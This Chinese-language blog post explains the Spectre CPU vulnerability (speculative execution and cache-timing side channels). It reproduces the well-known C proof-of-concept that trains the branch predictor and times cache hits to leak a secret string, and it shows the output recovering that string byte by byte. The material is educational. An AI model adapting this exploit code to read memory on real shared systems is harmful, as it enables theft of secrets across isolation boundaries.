---
layout: post
title: "机密计算: Spectre漏洞和原理"
date: 2024-03-26 21:56:48
index_img: /img/post_pics/os/spectre-meltdown.jpg
archive: true
tags:
    - TEE
    - Cache
    - Security
categories: 
    - Security
---

## 幽灵漏洞

2018年，Google安全团队披露了Meltdown（CVE-2017-5754）和Spectre漏洞（CVE-2017-5715/5753）。

<!-- more -->

这是利用CPU乱序执行和分支预测，通过旁路攻击（侧信道攻击）获取内存中的重要数据，或者注入故障使目标瘫痪。数以亿计的Intel、AMD和ARM的CPU受到影响。

## 简介

乱序执行和分支预测是为了提高性能，而软件系统厂商发布补丁，加强安全检查，降低了性能。相比乱序执行的Meltdown漏洞，幽灵漏洞影响范围更为广泛。

* 乱序执行：乱序执行通过允许程序指令流中的指令与前面的指令并行执行，有时在前面的指令之前并行执行，增加CPU利用率。
* 分支预测：
  * 处理器保持当前的寄存器状态，对程序将遵循的路径做出预测，并提前沿着预测路径执行指令。如果预测被证明是正确的，则提交推测执行的结果(即保存)，从而在等待期间产生优于空闲的性能优势。
  * 如果预测失败，通过恢复其寄存器状态并沿着正确的路径恢复，放弃其推测执行的工作。

预测失败时的执行路径，缓存中存在预测时提前执行的残留，这是此漏洞的关键之处。

## 攻击方法

```c
if (x < array1_size) {
    y = array2[array1[x] * 4096];
}
```

* 将array2从缓存中擦除，确保存放在内存中
* 多次输入有效的x，使得分支预测器为真
* 输入越界的x，对应机密字节k = array1[x]
* 分支预测使得array2[k]对应的一片数据加载到Cache中，这里大小是4KB
* 攻击者通过访问array2的所有4KB的数据，根据缓存命中时间（远快于内存访问）以此推断出k的值。

## 代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64]; 
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--) {

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));
            
            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);            /* READ TIMER */
            junk = *addr;                       /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++;  /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk;  /* use junk so code above won't get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv) {
    size_t malicious_x=(size_t)(secret-(char*)array1);   /* default for malicious_x */
    int i, score[2], len=40;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3) {
        sscanf(argv[1], "%p", (void**)(&malicious_x));
        malicious_x -= (size_t)array1;  /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }
    
    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d    ", value[0], 
            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    return (0);
}
```

![示意图](/img/post_pics/os/spectre.png)

运行结果：

```bash
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffdfc8... Unclear: 0x54='T' score=999    (second best: 0x01 score=816)
Reading at malicious_x = 0xffffffffffffdfc9... Unclear: 0x68='h' score=999    (second best: 0x01 score=835)
Reading at malicious_x = 0xffffffffffffdfca... Unclear: 0x65='e' score=999    (second best: 0x01 score=845)
Reading at malicious_x = 0xffffffffffffdfcb... Unclear: 0x20=' ' score=999    (second best: 0x01 score=801)
Reading at malicious_x = 0xffffffffffffdfcc... Unclear: 0x4D='M' score=999    (second best: 0x01 score=784)
Reading at malicious_x = 0xffffffffffffdfcd... Unclear: 0x61='a' score=999    (second best: 0x01 score=839)
Reading at malicious_x = 0xffffffffffffdfce... Unclear: 0x67='g' score=999    (second best: 0x01 score=818)
Reading at malicious_x = 0xffffffffffffdfcf... Unclear: 0x69='i' score=999    (second best: 0x01 score=848)
Reading at malicious_x = 0xffffffffffffdfd0... Unclear: 0x63='c' score=999    (second best: 0x01 score=817)
Reading at malicious_x = 0xffffffffffffdfd1... Unclear: 0x20=' ' score=999    (second best: 0x01 score=790)
Reading at malicious_x = 0xffffffffffffdfd2... Unclear: 0x57='W' score=999    (second best: 0x01 score=833)
Reading at malicious_x = 0xffffffffffffdfd3... Unclear: 0x6F='o' score=999    (second best: 0x01 score=796)
Reading at malicious_x = 0xffffffffffffdfd4... Unclear: 0x72='r' score=999    (second best: 0x01 score=817)
Reading at malicious_x = 0xffffffffffffdfd5... Unclear: 0x64='d' score=999    (second best: 0x01 score=797)
Reading at malicious_x = 0xffffffffffffdfd6... Unclear: 0x73='s' score=999    (second best: 0x01 score=796)
Reading at malicious_x = 0xffffffffffffdfd7... Unclear: 0x20=' ' score=999    (second best: 0x01 score=828)
Reading at malicious_x = 0xffffffffffffdfd8... Unclear: 0x61='a' score=999    (second best: 0x01 score=815)
Reading at malicious_x = 0xffffffffffffdfd9... Unclear: 0x72='r' score=999    (second best: 0x01 score=746)
Reading at malicious_x = 0xffffffffffffdfda... Unclear: 0x65='e' score=999    (second best: 0x01 score=823)
Reading at malicious_x = 0xffffffffffffdfdb... Unclear: 0x20=' ' score=999    (second best: 0x01 score=859)
Reading at malicious_x = 0xffffffffffffdfdc... Unclear: 0x53='S' score=999    (second best: 0x01 score=842)
Reading at malicious_x = 0xffffffffffffdfdd... Unclear: 0x71='q' score=999    (second best: 0x01 score=827)
Reading at malicious_x = 0xffffffffffffdfde... Unclear: 0x75='u' score=999    (second best: 0x01 score=805)
Reading at malicious_x = 0xffffffffffffdfdf... Unclear: 0x65='e' score=999    (second best: 0x01 score=781)
Reading at malicious_x = 0xffffffffffffdfe0... Unclear: 0x61='a' score=999    (second best: 0x01 score=855)
Reading at malicious_x = 0xffffffffffffdfe1... Unclear: 0x6D='m' score=999    (second best: 0x01 score=792)
Reading at malicious_x = 0xffffffffffffdfe2... Unclear: 0x69='i' score=999    (second best: 0x01 score=840)
Reading at malicious_x = 0xffffffffffffdfe3... Unclear: 0x73='s' score=999    (second best: 0x01 score=811)
Reading at malicious_x = 0xffffffffffffdfe4... Unclear: 0x68='h' score=999    (second best: 0x01 score=784)
Reading at malicious_x = 0xffffffffffffdfe5... Unclear: 0x20=' ' score=999    (second best: 0x01 score=794)
Reading at malicious_x = 0xffffffffffffdfe6... Unclear: 0x4F='O' score=999    (second best: 0x01 score=863)
Reading at malicious_x = 0xffffffffffffdfe7... Unclear: 0x73='s' score=999    (second best: 0x01 score=786)
Reading at malicious_x = 0xffffffffffffdfe8... Unclear: 0x73='s' score=999    (second best: 0x01 score=832)
Reading at malicious_x = 0xffffffffffffdfe9... Unclear: 0x69='i' score=999    (second best: 0x01 score=818)
Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x66='f' score=999    (second best: 0x01 score=800)
Reading at malicious_x = 0xffffffffffffdfeb... Unclear: 0x72='r' score=999    (second best: 0x01 score=785)
Reading at malicious_x = 0xffffffffffffdfec... Unclear: 0x61='a' score=999    (second best: 0x01 score=816)
Reading at malicious_x = 0xffffffffffffdfed... Unclear: 0x67='g' score=999    (second best: 0x01 score=784)
Reading at malicious_x = 0xffffffffffffdfee... Unclear: 0x65='e' score=999    (second best: 0x01 score=845)
Reading at malicious_x = 0xffffffffffffdfef... Unclear: 0x2E='.' score=999    (second best: 0x01 score=813)
```

参考：

[幽灵漏洞 - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/zh-cn/幽灵漏洞)
[The proof-of-concept code for "Spectre Attacks: Exploiting Speculative Execution". (github.com)](https://gist.github.com/anonymous/99a72c9c1003f8ae0707b4927ec1bd8a)
[cryptax/spectre-armv7: This is an attempt to implement Spectre on ARMv7 (github.com)](https://github.com/cryptax/spectre-armv7/tree/master)
[CVE - CVE-2017-5754 (mitre.org)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5754)
[bounds check bypass (CVE-2017-5753)](https://spectreattack.com/spectre.pdf)
[branch target injection (CVE-2017-5715)](https://spectreattack.com/spectre.pdf)
[rogue data cache load (CVE-2017-5754)](https://meltdownattack.com/meltdown.pdf)
[Security Bulletin\] Intel Processor Meltdown and Specter Security Vulnerability Bulletin - Alibaba Cloud Developer Forums: Cloud Discussion Forums](https://www.alibabacloud.com/forum/read-2878)
[hannob/meltdownspectre-patches: Summary of the patch status for Meltdown / Spectre (github.com)](https://github.com/hannob/meltdownspectre-patches)
[给程序员解释Spectre和Meltdown漏洞 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32784852)
[死磕Meltdown和Spectre漏洞，应对方案汇总-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1043767)
[继英特尔、ARM、AMD之后，苹果、高通、IBM均承认其处理器有被攻击风险 - 安全内参 | 决策者的网络安全知识库 (secrss.com)](https://www.secrss.com/articles/170)
[产品状态：CPU 推理执行攻击方法 - Google帮助](https://support.google.com/faqs/answer/7622138?hl=en)
[Endpoint Protection - Symantec Enterprise (broadcom.com)](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=99d1c47c-cf58-406b-9b28-987dc3cc054a&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)
[10個Q&A快速認識Meltdown與Spectre兩大CPU漏洞攻擊（內含各廠商修補進度大整理_1/10更新） | iThome](https://www.ithome.com.tw/news/120312)
[360：处理器Meltdown与Spectre漏洞修复简要指南-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/94179)
